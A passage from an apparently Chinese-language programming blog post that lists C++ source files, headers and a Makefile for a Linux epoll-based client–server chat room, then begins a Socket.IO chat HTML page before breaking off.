class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverAddr</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//&#x521B;&#x5EFA;&#x76D1;&#x542C;&#x7684;socket</span></span><br><span class="line">    <span class="keyword">int</span> listener;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// epoll_create&#x521B;&#x5EFA;&#x540E;&#x7684;&#x8FD4;&#x56DE;&#x503C;</span></span><br><span class="line">    <span class="keyword">int</span> epfd;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x5BA2;&#x6237;&#x7AEF;&#x5217;&#x8868;</span></span><br><span class="line">    <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; clients_list;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//CHATROOM_SERVER_H</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>client.cpp<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Client.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x5BA2;&#x6237;&#x7AEF;&#x7C7B;&#x6210;&#x5458;&#x51FD;&#x6570;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x5BA2;&#x6237;&#x7AEF;&#x7C7B;&#x6784;&#x9020;&#x51FD;&#x6570;</span></span><br><span class="line">Client::Client(){</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x521D;&#x59CB;&#x5316;&#x8981;&#x8FDE;&#x63A5;&#x7684;&#x670D;&#x52A1;&#x5668;&#x5730;&#x5740;&#x548C;&#x7AEF;&#x53E3;</span></span><br><span class="line">    serverAddr.sin_family = PF_INET;</span><br><span class="line">    serverAddr.sin_port = htons(SERVER_PORT);</span><br><span class="line">    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x521D;&#x59CB;&#x5316;socket</span></span><br><span class="line">    sock = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x521D;&#x59CB;&#x5316;&#x8FDB;&#x7A0B;&#x53F7;</span></span><br><span class="line">    pid = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x5BA2;&#x6237;&#x7AEF;&#x72B6;&#x6001;</span></span><br><span class="line">    isClientwork = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// epool fd</span></span><br><span class="line">    epfd = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;</span></span><br><span class="line"><span class="keyword">void</span> Client::Connect() {</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Connect Server: &quot;</span> &lt;&lt; SERVER_IP &lt;&lt; <span class="string">&quot; : &quot;</span> &lt;&lt; SERVER_PORT &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x521B;&#x5EFA;socket</span></span><br><span class="line">    sock = socket(PF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(sock &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">&quot;sock error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>); </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x7AEF;</span></span><br><span class="line">    <span class="keyword">if</span>(connect(sock, (struct sockaddr *)&amp;serverAddr, <span class="keyword">sizeof</span>(serverAddr)) &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">&quot;connect error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x521B;&#x5EFA;&#x7BA1;&#x9053;&#xFF0C;&#x5176;&#x4E2D;fd[0]&#x7528;&#x4E8E;&#x7236;&#x8FDB;&#x7A0B;&#x8BFB;&#xFF0C;fd[1]&#x7528;&#x4E8E;&#x5B50;&#x8FDB;&#x7A0B;&#x5199;</span></span><br><span class="line">    <span class="keyword">if</span>(pipe(pipe_fd) &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">&quot;pipe error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x521B;&#x5EFA;epoll</span></span><br><span class="line">    epfd = epoll_create(EPOLL_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(epfd &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">&quot;epfd error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>); </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//&#x5C06;sock&#x548C;&#x7BA1;&#x9053;&#x8BFB;&#x7AEF;&#x63CF;&#x8FF0;&#x7B26;&#x90FD;&#x6DFB;&#x52A0;&#x5230;&#x5185;&#x6838;&#x4E8B;&#x4EF6;&#x8868;&#x4E2D;</span></span><br><span class="line">    addfd(epfd, sock, <span class="literal">true</span>);</span><br><span class="line">    addfd(epfd, pipe_fd[<span class="number">0</span>], <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#xFF0C;&#x6E05;&#x7406;&#x5E76;&#x5173;&#x95ED;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;</span></span><br><span class="line"><span class="keyword">void</span> Client::Close() {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid){</span><br><span class="line">       <span class="comment">//&#x5173;&#x95ED;&#x7236;&#x8FDB;&#x7A0B;&#x7684;&#x7BA1;&#x9053;&#x548C;sock</span></span><br><span class="line">        close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">        close(sock);</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        <span class="comment">//&#x5173;&#x95ED;&#x5B50;&#x8FDB;&#x7A0B;&#x7684;&#x7BA1;&#x9053;</span></span><br><span class="line">        close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x542F;&#x52A8;&#x5BA2;&#x6237;&#x7AEF;</span></span><br><span class="line"><span class="keyword">void</span> Client::Start() {</span><br><span class="line"></span><br><span class="line">    <span class="comment">// epoll &#x4E8B;&#x4EF6;&#x961F;&#x5217;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">events</span>[2];</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;</span></span><br><span class="line">    Connect();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x521B;&#x5EFA;&#x5B50;&#x8FDB;&#x7A0B;</span></span><br><span class="line">    pid = fork();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x5982;&#x679C;&#x521B;&#x5EFA;&#x5B50;&#x8FDB;&#x7A0B;&#x5931;&#x8D25;&#x5219;&#x9000;&#x51FA;</span></span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">        close(sock);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) {</span><br><span class="line">        <span class="comment">// &#x8FDB;&#x5165;&#x5B50;&#x8FDB;&#x7A0B;&#x6267;&#x884C;&#x6D41;&#x7A0B;</span></span><br><span class="line">        <span class="comment">//&#x5B50;&#x8FDB;&#x7A0B;&#x8D1F;&#x8D23;&#x5199;&#x5165;&#x7BA1;&#x9053;&#xFF0C;&#x56E0;&#x6B64;&#x5148;&#x5173;&#x95ED;&#x8BFB;&#x7AEF;</span></span><br><span class="line">        close(pipe_fd[<span class="number">0</span>]); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// &#x8F93;&#x5165;exit&#x53EF;&#x4EE5;&#x9000;&#x51FA;&#x804A;&#x5929;&#x5BA4;</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please input &apos;exit&apos; to exit the chat room&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// &#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x8FD0;&#x884C;&#x6B63;&#x5E38;&#x5219;&#x4E0D;&#x65AD;&#x8BFB;&#x53D6;&#x8F93;&#x5165;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x7AEF;</span></span><br><span class="line">        <span class="keyword">while</span>(isClientwork){</span><br><span class="line">            bzero(&amp;message, BUF_SIZE);</span><br><span class="line">            fgets(message, BUF_SIZE, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// &#x5BA2;&#x6237;&#x8F93;&#x51FA;exit,&#x9000;&#x51FA;</span></span><br><span class="line">            <span class="keyword">if</span>(strncasecmp(message, EXIT, <span class="built_in">strlen</span>(EXIT)) == <span class="number">0</span>){</span><br><span class="line">                isClientwork = <span class="number">0</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// &#x5B50;&#x8FDB;&#x7A0B;&#x5C06;&#x4FE1;&#x606F;&#x5199;&#x5165;&#x7BA1;&#x9053;</span></span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                <span class="keyword">if</span>( write(pipe_fd[<span class="number">1</span>], message, <span class="built_in">strlen</span>(message) - <span class="number">1</span> ) &lt; <span class="number">0</span> ) { </span><br><span class="line">                    perror(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    } <span class="keyword">else</span> { </span><br><span class="line">        <span class="comment">//pid &gt; 0 &#x7236;&#x8FDB;&#x7A0B;</span></span><br><span class="line">        <span class="comment">//&#x7236;&#x8FDB;&#x7A0B;&#x8D1F;&#x8D23;&#x8BFB;&#x7BA1;&#x9053;&#x6570;&#x636E;&#xFF0C;&#x56E0;&#x6B64;&#x5148;&#x5173;&#x95ED;&#x5199;&#x7AEF;</span></span><br><span class="line">        close(pipe_fd[<span class="number">1</span>]); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// &#x4E3B;&#x5FAA;&#x73AF;(epoll_wait)</span></span><br><span class="line">        <span class="keyword">while</span>(isClientwork) {</span><br><span class="line">            <span class="keyword">int</span> epoll_events_count = epoll_wait( epfd, events, <span class="number">2</span>, <span class="number">-1</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">//&#x5904;&#x7406;&#x5C31;&#x7EEA;&#x4E8B;&#x4EF6;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; epoll_events_count ; ++i)</span><br><span class="line">            {</span><br><span class="line">                bzero(&amp;message, BUF_SIZE);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//&#x670D;&#x52A1;&#x7AEF;&#x53D1;&#x6765;&#x6D88;&#x606F;</span></span><br><span class="line">                <span class="keyword">if</span>(events[i].data.fd == sock)</span><br><span class="line">                {</span><br><span class="line">                    <span class="comment">//&#x63A5;&#x53D7;&#x670D;&#x52A1;&#x7AEF;&#x6D88;&#x606F;</span></span><br><span class="line">                    <span class="keyword">int</span> ret = recv(sock, message, BUF_SIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// ret= 0 &#x670D;&#x52A1;&#x7AEF;&#x5173;&#x95ED;</span></span><br><span class="line">                    <span class="keyword">if</span>(ret == <span class="number">0</span>) {</span><br><span class="line">                        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Server closed connection: &quot;</span> &lt;&lt; sock &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                        close(sock);</span><br><span class="line">                        isClientwork = <span class="number">0</span>;</span><br><span class="line">                    } <span class="keyword">else</span> {</span><br><span class="line">                        <span class="built_in">cout</span> &lt;&lt; message &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">                <span class="comment">//&#x5B50;&#x8FDB;&#x7A0B;&#x5199;&#x5165;&#x4E8B;&#x4EF6;&#x53D1;&#x751F;&#xFF0C;&#x7236;&#x8FDB;&#x7A0B;&#x5904;&#x7406;&#x5E76;&#x53D1;&#x9001;&#x670D;&#x52A1;&#x7AEF;</span></span><br><span class="line">                <span class="keyword">else</span> { </span><br><span class="line">                    <span class="comment">//&#x7236;&#x8FDB;&#x7A0B;&#x4ECE;&#x7BA1;&#x9053;&#x4E2D;&#x8BFB;&#x53D6;&#x6570;&#x636E;</span></span><br><span class="line">                    <span class="keyword">int</span> ret = read(events[i].data.fd, message, BUF_SIZE);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// ret = 0</span></span><br><span class="line">                    <span class="keyword">if</span>(ret == <span class="number">0</span>)</span><br><span class="line">                        isClientwork = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">else</span> {</span><br><span class="line">                        <span class="comment">// &#x5C06;&#x4FE1;&#x606F;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x7AEF;</span></span><br><span class="line">                        send(sock, message, BUF_SIZE, <span class="number">0</span>);</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            }<span class="comment">//for</span></span><br><span class="line">        }<span class="comment">//while</span></span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x9000;&#x51FA;&#x8FDB;&#x7A0B;</span></span><br><span class="line">    Close();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>client.h<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CHATROOM_CLIENT_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHATROOM_CLIENT_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Common.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x5BA2;&#x6237;&#x7AEF;&#x7C7B;&#xFF0C;&#x7528;&#x6765;&#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x548C;&#x63A5;&#x6536;&#x6D88;&#x606F;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span> {</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// &#x65E0;&#x53C2;&#x6570;&#x6784;&#x9020;&#x51FD;&#x6570;</span></span><br><span class="line">    Client();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Connect</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x65AD;&#x5F00;&#x8FDE;&#x63A5;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Close</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x542F;&#x52A8;&#x5BA2;&#x6237;&#x7AEF;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x5F53;&#x524D;&#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x521B;&#x5EFA;&#x7684;socket</span></span><br><span class="line">    <span class="keyword">int</span> sock;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x5F53;&#x524D;&#x8FDB;&#x7A0B;ID</span></span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// epoll_create&#x521B;&#x5EFA;&#x540E;&#x7684;&#x8FD4;&#x56DE;&#x503C;</span></span><br><span class="line">    <span class="keyword">int</span> epfd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x521B;&#x5EFA;&#x7BA1;&#x9053;&#xFF0C;&#x5176;&#x4E2D;fd[0]&#x7528;&#x4E8E;&#x7236;&#x8FDB;&#x7A0B;&#x8BFB;&#xFF0C;fd[1]&#x7528;&#x4E8E;&#x5B50;&#x8FDB;&#x7A0B;&#x5199;</span></span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x8868;&#x793A;&#x5BA2;&#x6237;&#x7AEF;&#x662F;&#x5426;&#x6B63;&#x5E38;&#x5DE5;&#x4F5C;</span></span><br><span class="line">    <span class="keyword">bool</span> isClientwork;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x804A;&#x5929;&#x4FE1;&#x606F;&#x7F13;&#x51B2;&#x533A;</span></span><br><span class="line">    <span class="keyword">char</span> message[BUF_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//&#x7528;&#x6237;&#x8FDE;&#x63A5;&#x7684;&#x670D;&#x52A1;&#x5668; IP + port</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverAddr</span>;</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//CHATROOM_CLIENT_H</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>clientMain.cpp<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Server.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x670D;&#x52A1;&#x7AEF;&#x4E3B;&#x51FD;&#x6570;</span></span><br><span class="line"><span class="comment">// &#x521B;&#x5EFA;&#x670D;&#x52A1;&#x7AEF;&#x5BF9;&#x8C61;&#x540E;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x7AEF;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>{</span><br><span class="line">    Server server;</span><br><span class="line">    server.Start();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>Makefile<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CC = g++</span><br><span class="line">CFLAGS = -<span class="built_in">std</span>=c++<span class="number">11</span></span><br><span class="line"></span><br><span class="line">all: ClientMain.cpp ServerMain.cpp Server.o Client.o</span><br><span class="line">$(CC) $(CFLAGS) ServerMain.cpp  Server.o -o chatroom_server</span><br><span class="line">$(CC) $(CFLAGS) ClientMain.cpp Client.o -o chatroom_client</span><br><span class="line"></span><br><span class="line">Server.o: Server.cpp Server.h Common.h</span><br><span class="line">$(CC) $(CFLAGS) -c Server.cpp</span><br><span class="line"></span><br><span class="line">Client.o: Client.cpp Client.h Common.h</span><br><span class="line">$(CC) $(CFLAGS) -c Client.cpp</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">rm -f *.o chatroom_server chatroom_client</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6D4B;&#x8BD5;&#x7ED3;&#x679C;&#xFF1A;<br>server:<br><img src="http://p4wiqzx0i.bkt.clouddn.com/Screenshot%20from%202018-10-04%2021-34-41.png" alt=""></p><p>client 1:<br><img src="http://p4wiqzx0i.bkt.clouddn.com/Screenshot%20from%202018-10-04%2021-34-51.png" alt=""></p><p>client 2:<br><img src="http://p4wiqzx0i.bkt.clouddn.com/Screenshot%20from%202018-10-04%2021-35-12.png" alt=""></p><hr><p>&#x505A;&#x7684;&#x65F6;&#x5019;&#x7A81;&#x7136;&#x60F3;&#x5230;&#x4E86;&#x4EE5;&#x524D;&#x505A;&#x8FC7;&#x7684;&#x4E00;&#x4E2A;&#x548C;&#x8FD9;&#x4E2A;&#x5F88;&#x76F8;&#x4F3C;&#x7684;&#x4E1C;&#x897F;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x4E0A;&#x6B21;&#x505A;&#x7684;&#x65F6;&#x5019;&#x4F7F;&#x7528;node js&#x6765;&#x505A;&#x7684;&#x8FD9;&#x6B21;&#x4F7F;&#x7528;c++&#x6765;&#x5B9E;&#x73B0;&#x7684;&#x3002;</p><p>index.html<br></p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Socket.IO chat<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">      * { <span class="attribute">margin</span>: <span class="number">0</span>; <span class="attribute">padding</span>: <span class="number">0</span>; <span class="attribute">box-sizing</span>: border-box; }</span></span><br><span class="line"><span class="css">      <span class="selector-tag">body</span> { <span class="attribute">font</span>: <span class="number">13px</span> Helvetica, Arial; }</span></span><br><span class="line"><span class="css">      <span class="selector-tag">form</span> { <span class="attribute">background</span>: <span class="number">#000</span>; <span class="attribute">padding</span>: <span class="number">3px</span>; <span class="attribute">position</span>: fixed; <span class="attribute">bottom</span>: <span class="number">0</span>; <span class="attribute">width</span>: <span class="number">100%</span>; }</span></span><br><span class="line"><span class="css">      <span class="selector-tag">form</span> <span class="selector-tag">input</span> { <span class="attribute">border</span>: <span class="number">0</span>; <span class="attribute">padding</span>: <span class="number">10px</span>; <span class="attribute">width</span>: <span class="number">90%</span>; <span class="attribute">margin-right</span>: .<span class="number">5%</span>; }</span></span><br><span class="line"><span class="css">      <span class="selector-tag">form</span> <span class="selector-tag">button</span> { <span class="attribute">width</span>: <span class="number">9%</span>; <span class="attribute">background</span>: <span 